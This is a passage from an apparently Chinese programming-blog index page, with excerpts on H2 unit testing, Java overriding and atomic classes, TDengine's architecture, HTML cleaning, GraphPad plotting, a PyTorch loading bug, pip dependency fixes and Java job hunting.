[1. 1. 1.] tensor([1., 1., 1.], dtype=torch.float64)
[2. 2. 2.] tensor([2., 2., 2.], dtype=torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/704cf09a816547d2c591fc32fa817d07/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed472433f496b50f515974c91c7e151f/" rel="bookmark">
			使用H2进行单元测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		主要针对MybatisPlus与H2内存数据库进行单元测试。
现如今我们在单元测试中针对service/DAO层测试时，存在以下重要问题： 1.需要启动完整的Spring容器，造成启动时间过长
2.依赖中间件过多，测试配置文件需要编写与DAO层测试无意义的配置
3.需要搭建各种环境(mysql,redis,kafka等)
4.每个测试用例都对应一套SQL,并且会对本地的数据库造成影响
所以针对上述问题，我们在单元测试要达到以下目的：
1.针对DAO层单元测试(service层会互相引用和循环依赖)
2.不启动完整容器，不需要多余配置
3.使用内存数据库，不需要搭建其他环境，保证测试隔离
4.单个测试用例对应自己的SQL
H2内存数据库的优势 1.占用空间小
2.即用即消
3.读写速度很快
4.支持嵌入模式使用数据库，在项目中只需导入依赖就可以使用
引入核心依赖 引入依赖,注意版本之间的兼容性
&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter-test&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.h2database&lt;/groupId&gt; &lt;artifactId&gt;h2&lt;/artifactId&gt; &lt;version&gt;1.4.200&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 方式一:配置文件 主要讲解测试用例的配置，对于DAO层接口不做详细介绍。@MybatisPlusTest注解默认情况下，它将配置MyBatis（MyBatis-Spring）组件（SqlSessionFactory和SqlSessionTemplate），配置MyBatis映射器接口以及配置内存嵌入式数据库。默认情况下，MyBatis测试是事务性的，并且在每个测试结束时都会回滚。
@MybatisPlusTest @RunWith(SpringRunner.class) @MapperScan("com.XXX.mapper") //扫描要测试的DAO层接口 @ActiveProfiles("test") public class UserMapperTest { ...... } 配置文件application-XXXX.yml,指定初始化数据库的SQL文件
spring: datasource: schema: classpath:init_table.sql 方式二：注解 测试用例相关注解，@Sql会初始化指定的SQL文件
@MybatisPlusTest @RunWith(SpringRunner.class) @MapperScan("com.XXX.mapper") @Sql("create.sql") public class UserMapperTest { . . . } @Sql注解细节说明 @Sql用于注释测试类或测试方法，以配置在集成测试期间针对给定数据库运行的SQL脚本
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed472433f496b50f515974c91c7e151f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6df60c3e1937b2cd818cf735353297c1/" rel="bookmark">
			2020-11-13
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java的重写 参数列表与被重写方法的参数列表必须完全相同。
返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。
访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。
父类的成员方法只能被它的子类重写。
声明为 final 的方法不能被重写。
声明为 static 的方法不能被重写，但是能够被再次声明。
子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。
子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。
重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。
构造方法不能被重写。
如果不能继承一个类，则不能重写该类的方法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3866cb4650955fd343460b7d92cbbea2/" rel="bookmark">
			彻底开源、十倍性能的背后：TDengine 核心技术首度公开
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2020年11月7日，TDengine技术开放日（北京站）在中关村举办。开源一年零四个月，14k Star，3.6k Fork，日增100+的开源用户数……除了这些亮眼的数字外，本次技术开放日上，TDengine核心作者团队，还亮出了杀手锏，首度公开了TDengine彻底开源、十倍性能的背后核心技术和设计思想。特此回顾，希望能帮助更多开发人员和物联网从业者深入了解TDengine的优势与技术理念。回顾视频和演讲PPT的获取方式见文末。
当万物互联的理想一步步走向现实，物联网产业也开始面对一系列前所未有的挑战。其中，缺乏针对海量设备数据的处理工具是众多从业者面临的关键问题：互联网流行的大数据解决方案在物联网领域往往显得“水土不服”，在性能、成本、复杂性、灵活性等方面都很难满足行业期望。由于物联网大数据具备许多独有的特性，物联网产业亟需一种专为自身设计优化的大数据平台技术，解决不断增长的海量数据处理需求。
面对这一市场空白，涛思数据开发了自主可控的高性能、可伸缩、高可靠、零管理的物联网大数据平台TDengine，可广泛运用于物联网、车联网、工业互联网、IT运维等领域。通过一系列技术创新，TDengine取得了比通用大数据平台高出10倍以上的性能与更低的总体成本，解决了困扰物联网企业的一大难题。开源以来，TDengine在GitHub已收获14k Star和3.6k fork，得到了广泛的关注和好评，成为中国开源软件的榜样力量。
十倍性能的背后：TDengine的核心技术解析 相比现有的通用数据库技术，TDengine可以每秒处理数百万请求，性能提升10倍以上。本次活动开场，涛思数据创始人陶建辉为与会者深度解析了TDengine达到如此高性能背后所做的技术创新。
TDengine不单单是一个时序数据库，还包含缓存、数据订阅、流式计算等一系列功能，可以为工业互联网、物联网等场景提供一站式的全栈数据处理解决方案。——陶建辉
就本质而言，TDengine的设计目标是一个面向物联网的大数据平台，使用户无需集成Kafka、Spark、Redis等额外的解决方案，从而降低开发和维护成本。另一方面，TDengine的轻量化特性（完整安装包2MB左右）也可以在边缘侧代替SQlite，并提供了后者不具备的数据保留策略、流式计算、采样等功能。TDengine还可以对接Kafka、组态软件、Python等语言和技术应用，实际使用中非常灵活。
TDengine之所以能够实现极高的性能，是因为产品充分利用了物联网大数据的十大特性：1）时序；2）结构化；3）采集点数据源唯一性；4）数据较少更新/删除；5）数据多按日期删除；6）写操作为主，读操作为辅；7）数据流量平稳；8）数据包含统计/聚合等实时计算操作；9）数据多按指定时间段和区域查找；10）数据量较大。TDengine从设计之初就针对上述特性专门优化，为物联网场景量身定制。另一方面，TDengine的代码库完全自主编写，不包含任何第三方库，因而可以在优化层面做到极致。
物联网传感器采集的数据都是符合时间顺序的，针对这一特性，TDengine创新地改变了数据模型，引入“一个采集点一张表”的模式和分块连续存储，从而简化了单点的数据添加操作，加快了数据的插入和查询速度。
在写入流程方面，TDengine将每个传感器当作一个消息队列，在内存中先进先出，保证新采集的数据都在内存中。数据库则按时间段分区，可以快速定位读取历史数据。这样的模型还利于多级存储，通过时间段区分数据热度来降低存储成本。
为了解决新模型带来的数据表数量过于庞大的问题，TDengine还引入了“超级表”的理念，用超级表来描述数据的各个类型，为数据表加上了带有静态属性的标签，便于众多采集点的高速数据聚合查询。超级表将时序数据和标签数据分离存储，可以大幅节约存储空间，实现全内存高速存储和查询。由于标签可以事后增删改查，因此很适合处理历史数据和多维分析。TDengine的数据订阅功能支持表/超级表订阅，后者还可以实现条件过滤。最后，TDengine还通过数据订阅支持边云协同，可实现多级结构。
在后续开发计划中，TDengine还将在数据采集侧提供更多连接器，在数据分析侧无缝对接各种可视化/BI工具，并提供事件驱动的流式计算功能。TDengine还将持续为各行业提供特有的分析函数，例如电力行业的截面数据、化工行业的特殊函数等，为更多应用场景提供高度优化的解决方案。
TDengine 2.0 的集群设计思想与工作机制 2020年8月发布的TDengine 2.0是一次重大更新，引入了大量全新特性。陶老师的分享之后，涛思数据联合创始人关胜亮介绍了TDengine 2.0集群的设计思想与工作机制。
TDengine 2.0的关键特性是采用了FQDN（完全限定域名）来区分物理和数据节点。物理节点是独立的计算机，而数据节点是前者上的实例，包含许多虚拟节点。通过多个虚拟节点，TDengine可以将计算资源和数据分片在很多异构机器上。此外，特定虚拟节点还会充当管理节点。
在上述结构中，心跳负责维持管理状态，客户端需要查询/写入时则从管理节点获取虚拟节点的路由信息，然后找到对应的数据节点获得服务。不同节点之间的数据采用主从复制模式，通讯则采用TCP/UDP混合模式。
由于数据节点实现了虚拟化，就可以将节点数据根据需要分散在不同物理机器上，以防止数据过热、倾斜并提升可靠性等等。当数据在不同节点有多个副本时，通过主从选举的方式选出主节点。在不同节点之间的数据复制默认为异步，以显著提升复制速度。但平台也针对安全性需求较高的场景提供了同步复制选项。出现数据不同步的问题时，平台还提供了数据恢复的机制。
TDengine的数据分片是基于虚拟节点（Vnode）的，每个表只进入一个虚拟节点，每个虚拟节点则包含多个表。新建虚拟节点时，系统会自动选择负载较低的物理机器创建节点。每个虚拟节点大约维持在一万表左右以实现最佳性能。管理节点则根据各虚拟节点的负载状况进行实时打分，并根据打分情况实施负载均衡。由于分片策略是在表建立时确定的，因此可能存在多个热点表同时进入单个虚拟节点的情况，造成节点过热，这是目前存在的设计缺陷。不过由于数据表数量较多，因此这种情况出现的几率较少。在数据负载均衡调整时，通过副本动态增加和减少可以持续提供服务，防止中断。
健壮性层面，引擎会严格保证异步或掉线节点不能提供服务，并会在数据同步和查询时校验每个数据块，保证数据完整性。
如虎添翼：TDengine的存储和压缩算法详解 存储和压缩技术是数据科学中的关键环节，优秀的大数据平台必须搭配优秀的存储算法。关胜亮分享结束后，涛思数据联合创始人程洪泽讲解了TDengine的存储和压缩算法技术细节。
如前所述，TDengine主要针对时序数据进行优化设计。有的时序数据会长时间固定，有的会存在变化趋势，还有的会有一定波动范围；此外，各种数据都可能会产生跳变异常。针对这些特性，TDengine采用单采集点单张表、数据连续存储和BRIN索引方法。由于数据分片的基础是虚拟节点，因此很容易利用虚拟节点实现多核并发加速。同一个虚拟节点内的数据按时间分区，同一时间段数据存放在同一文件内，这样可以更好地适应按时间段查询和删除的操作。
TDengine针对时序数据的特点，专门研发了TSDB存储和查询引擎。TSDB存放了虚拟节点中表的META信息以及时序数据（采集信息），后者以行和列两种结构存储。META包括表/超级表的SCHEMA、子表TAG值、TAG SCHEMA和子表/超级表的从属关系。META操作先在内存中进行，最后序列化并写入硬盘。
META数据根据子表的第一个TAG值建立一个内存索引，而虚拟节点只对TAG的第一个值索引，因此速度最快。META数据写入内存时会同时生成序列化记录，以append only形式存储到内存buffer。内存数据达到一定量后触发落盘，更新的序列化META数据以append only形式写入硬盘META文件。
TSDB内存中的时序数据为行存储，因而支持以append only形式添加buffer，从而充分利用内存资源，有利于压缩。落盘时，时序数据会转化为列存储，维护BRIN索引，引入LAST文件和SUB-BLOCK机制处理文件碎片化。
TSDB启动时会事先分配一个BUFFER POOL作为写入缓冲，缓冲区块大小和个数可配，区块个数可修改。META数据和采集数据从缓冲块申请写入空间，写入引擎向BUFFER POOL申请缓冲区块，写满的缓冲区块占总缓冲区块的三分之一时触发落盘操作。落盘时，缓冲区块中的数据写入到META等文件中，落盘结束后缓冲区块归还给BUFFER POOL，形成循环机制。
查询时需要查询MEM、iMEM以及对硬盘的文件数据进行合并查询。时序数据有一定的乱序情况，如果由LSM来处理会有大量的文件合并。为了避免这个问题，TSDB将标签数据和时序数据分离存储。但由于硬盘上只对时间戳做了索引，对非主键没有做索引，因此非主键的查询和过滤效率相对较低；由于硬盘是列存储，为提升压缩效率就需要足够的数据量，所以这对内存也有一定的要求。
压缩算法方面，TDengine对于不同的数据类型采用不同的压缩算法，有三种压缩设置。首先是无压缩；然后是一级压缩，根据不同的数据类型进行压缩；二级压缩在不同的列进行压缩后，用通用的压缩算法进行压缩。TDengine使用的压缩算法包括DELTA-OF-DELTA、ZIG ZAG Encoding等。相比很多数据库来说，TDengine的列存储和二级压缩特性使其对于时序数据能有很大的压缩效率。
相信代码：开源软件CI/CD的经验谈 作为国内开源软件企业的佼佼者，涛思数据很早就形成了基于GitHub的完整CI/CD流程，在长期的实践中积累了丰富的经验。在本场活动的最后，研发工程师刘溢清向与会者介绍了涛思数据总结出的CI/CD最佳实践。
今天的软件产业呈现开源、全球化和高度协作的特征，同一款软件可能有很多来自世界各地的开发与贡献者。从 0.9^5=0.59 这一公式来看，如果开发过程中有5个环节，都只做到90分，那么整个流程的成绩就要下降到59分，这是非常显著的累积效应。为了消除不同开发人员的个体影响，软件开发流程应该高度信任CI/CD，确保流程质量不打折。
在涛思数据，平均每天需要处理8次推送请求，目前总共有858个测试用例，PR总量达2558。为了解决所有这些测试需求，涛思数据通过CI/CD解决了四大问题：
实时发现代码错误并报警，帮助开发人员快速修正错误；2. 无人工干预，减少人为错误的出现几率；3. 自动生成代码质量报告，帮助开发人员检查动态开发质量。静待代码质量则使用静态检查工具；4. 自动生成各模块版本标识。 在涛思数据，开发团队以GitHub为CI/CD的核心平台，并使用Travis和Appveyor分别负责Linux和Windows版本的测试。全量测试和交付由Jenkins完成。COVERALLS主要保证代码覆盖率。
团队现在每两周发布一次版本并做更新。开发流程主要分为两部分：第一部分针对新特性，新特性合并完成后，在第二周周三下午拉一个分支测试并修复，之后发布新版本，并合并到master分支。当用户在M1版本发现问题时，团队就要对这个分支进行问题修复并交付给用户，同时合并到master分支来保证代码的一致性。
每当提交代码后，Windows/Linux版本需要分别通过Appvayor和Travis做简单的编译和测试，两项通过以后再由开发人员合并代码，保证代码中的错误可以第一时间得到修复。
由于公司测试用例较多，因此引入了Jenkins应对全量测试需求。Jenkins可以自由化部署，没有运行时间和资源限制，大家可以根据自己的服务器来配置。Jenkins跨平台很方便，对各种OS和指令集平台都有很好的支持。它还有丰富的插件，可以简化很多流程。
整个CI/CD流程来看，分为预编译、编译工作、全量测试和版本发布几大环节。每天下班以后会持续做全量测试。COVERALLS检查代码覆盖率，目前TDengine的覆盖率是77.43%，还有一些提升空间。Valgrind监测内存泄露并做代码监测，Coverity Scan提供整体反馈。
通过这一套CI/CD体系，涛思数据获得了明显的生产力提升：1. 检查代码的时间成本下降到了过去的七分之一。2. case覆盖率提升两倍。3. 代码从提交到发布的速度比之前快六倍。
开源与创新的力量：TDengine与社区共赢未来 除了几位老师的高质量分享，本场活动还特别设置了两个颁奖环节。首先是涛思数据举办的Hive MQ插件开发竞赛，大赛旨在奖励大数据时代的前沿探索者，来自大连的谭雪峰荣获大奖。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3866cb4650955fd343460b7d92cbbea2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2192bc5bdd0963fffb6bf3fbd0dd7062/" rel="bookmark">
			处理html文本，保留指定标签、属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 from html import parser from lxml.html.clean import Cleaner # 保留标签的src、href属性 safe_attrs =['src', 'href'] # 保留的标签 allow_tags = ["div", "p", "img", "video", "h1","h2","h3","h4","h5", "h6", "br", "a", "blockquote"] cleaner = Cleaner(safe_attrs=safe_attrs, allow_tags=allow_tags, remove_unknown_tags=False) clean_content = cleaner.clean_html(content) # 处理后的标签内的url会被编码，进行解码 clean_content = parser.unescape(clean_content) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2737682ba05cefcdc7c17a2249678f82/" rel="bookmark">
			c&#43;&#43; 显示三维散点图_绘制柱形图&amp;amp;散点图的秘密是...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上图是Neuron 2016 (IF=13.974)年十月发表的一篇文献中的图，右图的统计图是左图Western条带Nuak1水平柱状图和散点图共存图。这种表现形式的优点是既能够很好显示数据的均值(Mean)和标准差(SD)或者标准误(SEM)又能以散点显示数据的分布。那么如何绘制这种柱状图和散点图共存图呢？
接下来我们使用Graphpad Prism 7.0(win7，64位系统)给大家分享如何绘制柱状图与散点图共存图。
步骤如下：
Step1
打开Graphpad Prism 7.0软件，在New table ＆ graph中选择Column(列)，Enter/import data有三种数据输入方式，在此我们选择Enter replicate values，stacked into columns(输入平行数据使之成列)。其他两个选项分别为输入配对的重复测量值和输入已经计算好的均值和误差值。
注：绘制柱状图与散点图共存图不能使用第三种输入已经计算好的均值和误差值输入方式，因其本身只有均值和误差值，故不会显现数据分布的散点图。
新建数据Data1界面如下：
Step2
输入数据列，共5列
在Graphs下点击Data1进入Change Graph Type界面。Graph family下可以选择XY,Column……Column bar graph 默认显示Mean with SD，可以根据需要改为SEM。Preview下可以看见Data1绘图的效果，右边的三角形可以切换不同图形的预览。
选择柱状图和散点图共存图，Scatter plot with bar，Plot： Mean with SD(可根据需要选择)。柱状图和散点图共存图在此有两种方式可以选择一种是垂直的柱状图与散点图共存图，另一种是水平的柱状图散点图共存图，我们在此以垂直的柱状图与散点图共存图为例。
水平的柱状图散点图共存图：
Data1垂直的柱状图与散点图共存图最初效果如下：
我们可以看到最初效果中数据列名称A、B、C……为倾斜45°角模式。
双击列名称，进入Format Axes界面，可以看见Location of numbering/labling 此时为Below，angled(向下，角度)，角度为45°。
有以下几种选择方式：
None无标记:
Above标记朝上；Below，horizontal 朝下，水平；Below，vertical 朝下，垂直；Below，angled 朝下，角度(可在Numbering/labeling angle选择角度大小)。
Step3
进行美化修饰，修改纵坐标为Recognition Index(RI)
双击散点，进入Format Graph界面，选择Data set，Global，change all data sets (选择所有数据列)
将所有散点的Symbols Shape改为圆形，Size由4改为3。
效果如下：
双击散点，在Format Graph的Data set中分别选择Data1：A，Data1：B……更改其对应的颜色。Error bars 统一改为蓝色(9 E)。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2737682ba05cefcdc7c17a2249678f82/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/194ab090791995456c351d78d461b472/" rel="bookmark">
			原子类（一）——AtomicInteger
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原子操作 原子操作是指不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会有任何线程上下文切换。
原子操作可以是一个步骤，也可以是多个操作步骤，但是其顺序不可以被打乱，也不可以被切割而只执行其中的一部分，将整个操作视作一个整体是原子性的核心特征。
原子类 在Java中提供了很多原子类，主要把这些原子类分成以下几大类
原子更新基本类型或引用类型 AtomicBoolean
原子更新布尔类型，内部使用int类型的value存储1和0表示true和false，底层也是对int类型的原子操作。AtomicInteger
原子更新int类型。AtomicLong
原子更新long类型。AtomicReference
原子更新引用类型，通过泛型指定要操作的类。AtomicMarkableReference
原子更新引用类型，内部使用Pair承载引用对象及是否被更新过的标记，避免了ABA问题。AtomicStampedReference
原子更新引用类型，内部使用Pair承载引用对象及更新的邮戳，避免了ABA问题。 原子更新数组中的元素 原子更新数组中的元素，可以更新数组中指定索引位置的元素。
AtomicIntegerArray
原子更新int数组中的元素。AtomicLongArray
原子更新long数组中的元素。AtomicReferenceArray
原子更新object数组中的元素。 原子更新对象中的字段 原子更新对象中的字段，可以更新对象中指定字段名称的字段。
AtomicIntegerFieldUpdater
原子更新对象中的int类型字段。AtomicLongFieldUpdater
原子更新对象中的long类型字段。AtomicReferenceFieldUpdater
原子更新对象中的引用类型字段。 高性能原子类 高性能原子类，是Java8中增加的原子类，它们使用分段的思想，把不同线程hash到不同的段上去更新，最后再把这些段的值相加得到最终的值。
Striped64
下面四个类的父类。LongAccumulator
long类型的聚合器，需要传入一个long类型的二元操作，可以用来计算各种聚合操作，包括加乘等。LongAdder
long类型聚合器，LongAccumulator的特例，只能用来计算加法，且从零开始计算。DoubleAccumulator
double类型的聚合器，需要传入一个double类型的二元操作，可以用来计算各种聚合操作，包括加乘等。DoubleAdder
double类型聚合器，DoubleAccumulator的特例，只能用来计算加法，且从零开始计算。 AtomicInteger使用 import java.util.concurrent.atomic.AtomicInteger; public class AtomicIntegerDemo { public static void main(String[] args) throws InterruptedException { test1(); test2(); } private static void test1() throws InterruptedException { Counter counter = new Counter(); for (int i = 0; i &lt; 10; i++) { new Thread(()-&gt;{ for (int j = 0; j &lt; 1000; j++) { counter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/194ab090791995456c351d78d461b472/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/903a7be41ca87db58200b03de9a12435/" rel="bookmark">
			pytorch 加载模型后测试的同一条数据得到的结果不一样
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题现场： 背景：Python3.6，pytorch1.+，使用huggingface.co工具去finetuning bert模型，在多gpu上训练保存模型，在cpu上加载去做预测。
加载模型，对同一条数据测试结果不一样。
当时检查了：1
1.模型的状态是否是model.eval()?————不是这个问题
2.是否使用torch.no_grad() ，这句代码的意思是使得本次过的样本不会更新梯度。————不是这个问题
model.eval() with torch.no_grad(): logits = model(input_ids, token_type_ids=None, attention_mask=(input_ids &gt; 0)) 3.是否有随机成分在里面，比如dropout，导致每次的网络结构都不一样。————不是这个问题
huggingface.co有句解释：
Models are now set in evaluation mode by default when instantiated with the from_pretrained() method. To train them don’t forget to set them back in training mode (model.train()) to activate the dropout modules. 意思是eval（）状态下没有dropout操作，在model.train()状态下，才激活dropout操作。
4.是不是对输入进行encode时，编码的tensor不一致？————不是这个问题
5.本项目中，有两点是“自己拼凑的代码”，一个是模型保存，一个是模型加载。————是“拼凑代码”的问题
模型定义使用的huggingface，多gpu并行训练模型，保存的时候，不能使用huggingface工具中的保存属性，网上查了一些方案，使用torch.save()保存模型。
if isinstance(model, torch.nn.DataParallel): torch.save(model.state_dict(), config.save_path) 预测加载模型时，结合huggingface和torch的文档，使用如下加载模型：
model_state_dict = torch.load(model_path, map_location=torch.device('cpu')) self.model = BertForSequenceClassification.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/903a7be41ca87db58200b03de9a12435/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/090ac045b7ef558ad54ae1e63d5fca69/" rel="bookmark">
			Java 关于Properties的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 什么是properties? 它是一种文本格式。里面的数据有自己规定的格式，一般存放键值对类型的数据。
好处：可以很好很方便的跟java程序进行交互。java提供专门跟properties交互的API。存到properties文件中的内容是可以持久化的。
2.properties的使用 里面的注释是使用#键值之间一般使用=分割。也可以使用:号跟空格分割，但是尽量使用=号。 3. JAVA跟properties的交互 3.1 数据的读取
// 1, java --- IO --- 硬盘上的文件 File file = new File("day04-02/src/hello.properties"); System.out.println(file.exists()); FileInputStream fis = new FileInputStream(file); // 2, java 已经帮我们定义好了Properties类 Properties p = new Properties(); p.load(fis); // 枚举器（Hashtable Vector） 迭代器 Enumeration&lt;Object&gt; keys = p.keys(); while (keys.hasMoreElements()){ String key = (String) keys.nextElement(); System.out.println(key + " = " + p.getProperty(key) ); } 3.2 数据的存储
public static void main(String[] args) throws IOException { //1配置文件，如果不存在就创建文件 File f = new File("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/090ac045b7ef558ad54ae1e63d5fca69/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a85e9ec3ba62842f787c6fe4996b4752/" rel="bookmark">
			电脑任务管理器_电脑卡死的三种处理办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		电脑有时候也变成一个坑货，不着急用的时候它不卡，越是着急用它越是卡顿，一秒一卡，真是让人火上浇油。但电脑卡死往往有3种不错的处理办法供我们大家选择。
办法一：打开任务管理器
这也是一个非常快速的小办法，虽然不能从根本上解决卡顿的现象，但可以快速的缓解，等到之后我们再采用别的措施，那就是打开任务管理器!把我们的鼠标放到最底部空白处右击，右击之后就会看到任务管理器我们结束几个进程，就可以把电脑的速度提高。有的时候你结束几个进程就会发现速度明显提高了，卡顿短时间之内不会发生，暂时拯救了电脑。推荐阅读：任务管理器快捷键
办法二：清理电脑风扇灰尘
这是一个治标治本的办法，当然要建立在电脑风扇灰尘过多的情况下。有的时候，电脑本身灰尘过多的话也会影响速度，因为风扇的灰尘太多，风叶上都布满灰尘没有办法快速的运转，无法很好的散热。当热气沉积在电脑内部，卡顿的现象更加容易发生，此时我们只需要到专业的电脑修理中心清理灰尘即可。
办法三：添加一个内存条
有的时候电脑卡不是因为内部的因素，而是因为一些硬件设备不到位的缘故，而内存小也是电脑普遍会出现的一个问题。如果我们的电脑使用的时间久了，内存变小也非常正常，因为现在的软件都在更新着，每一个软件更新一次它的体积就会增大一些。这时内存不够用很正常，我们可以考虑添一个内存条，电脑卡顿现象即可缓解很多。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2bd57b79f3f51472ab016820d8b289b/" rel="bookmark">
			echarts世界地图(含中国省份地图)，中国省份下钻到县，点击按钮返回上一级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 效果图:
中国地图高亮显示 并且地图中国地图在可视范围的中心
中国地图下钻
省份下钻
小站 : www.flot.top
在线预览地址 https://guangshizhao.github.io/world-map
需要源码的同学可以自行去本人的仓库clone (里面有世界地图的源码和中国省份的源码)
github仓库地址: https://github.com/guangshizhao/world-map
如果github服务器抽风可以去码云clone
码云(gitee)仓库地址:https://gitee.com/zhaoshiguang/world-map
如果有什么疑问欢迎邮件沟通 : 45664741@qq.com
转载请注明出处 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e73527b3a67ce553643abf60a5f90645/" rel="bookmark">
			解决urllib3模块和chardet模块版本不一致问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		错误提示：RequestsDependencyWarning: urllib3 (1.25.10) or chardet (3.0.4) doesn’t match a supported version! 查询后发现是urllib3模块和chardet模块版本不一致
解决办法
卸载urllib3和chardet，并且更新requests模块
代码
pip uninstall urllib3
pip uninstall chardet
pip install --upgrade requests
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/312b5787fcc25dbc8a7dfec988c6e33a/" rel="bookmark">
			万字长文| 最详尽的JAVA后端开发求职路线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本人 21届双非本科，在大二的时候开始学习Java感谢我的恋爱6年之久的女朋友哈（她也是Java 🤣 ），一同经历了一年多的努力，互相理解互相鼓励，秋招也都算一起拿到了满意的offer（有赞、网易、京东、美团、奇安信、蘑菇街、58等），虽然没有像大佬们一样拿了很多大厂，但对于我们双非本已经心满意足了 😅。以下分享一下个人的一些总结！大佬勿喷哦 🤣！
关于校招
大家都知道每年都有春招和秋招两次招聘 ，春招一般在2月中旬就陆续开始了，面向的是 本届应届生招聘 和 次届的暑期实习生招聘，对于应届生招聘，可能春招的招聘力度与hc是没有秋招多的，据我了解大多数应该是大佬们秋招拒了很多offer后的补录名额，可能竞争会相比与秋招更加激烈，但是春招对于次届毕业生而言，个人觉得是进入大厂的好机会，各大公司会招聘暑期实习生， 面试难度会比秋招小一些，转正的概率还是很大的，也就是说人家还在忙于秋招，你已经转正结束秋招了（身边有几个朋友就是转正在大厂了）！当然有很多大佬会选择 鱼与熊掌兼得🤣边忙于实习转正答辩边秋招面试。
秋招的话，是应届生最好的招聘机会，提前批有的公司7月份就已经开始了，8月中旬可能陆陆续续开始正式批，个人觉得如果准备充分，就大胆的投提前批吧，一般提前批都是免笔试直接面试的，况且SP的几率挺大的应该，但是竞争会激烈一些，都是大神，还有要注意有的公司声称提前批与正式批不冲突，但其实往往都会有你的面试表现的，提前批如果表现不好的话，可能就凉凉了🤣，我今年就没敢投，也有部分原因是在实习一天很忙，也没能抽出时间复习。
个人的春招秋招面试感受：面试可以很快的提升自己，每一次面试都要找一下自己的不足，最好手机录音，之后review一下自己答的不好的地方，避免下次面试答不出来，我第一次面试是在大三找寒假日常实习，记得那时面试很紧张，说话有些语无伦次，没有任何面试技巧，后来随着面试场次的增多，自己也变得能“白话”（东北话，就是能说会道的意思吧 🤣）了，秋招的时候每次都能和面试官聊的比较好！除了技术面之外还有就是有些公司hr也有决定权，所以提前准备一些hr常问的，不至于现场答不好，被hr PASS掉。下面举例一些我认为比较难答的问题：
说三个优点？
说三个缺点？
你认为你是怎样的人？
与其他同学相比，你的优势？
你在实习中遇到的最大困难或者挑战？
（技术终面也常问）
在校园时最困难的时候？
遇到过最大的挫折？
看过哪些非技术书，能讲讲这本书大概讲了什么吗？
等等问题吧
关于准备
下面分享一下楼主秋招前的准备吧（仅供参考哈）！
首先Java开发，我个人主要是先BFS，再DFS，针对不同面试官有不同的收获吧，有的就比较考察知识面的广度，有的就比较喜欢深挖一个点，挖到你不会为止🤐！总之多多准备是没有坏处的哈。
个人主要分为以下几个模块准备的：
项目
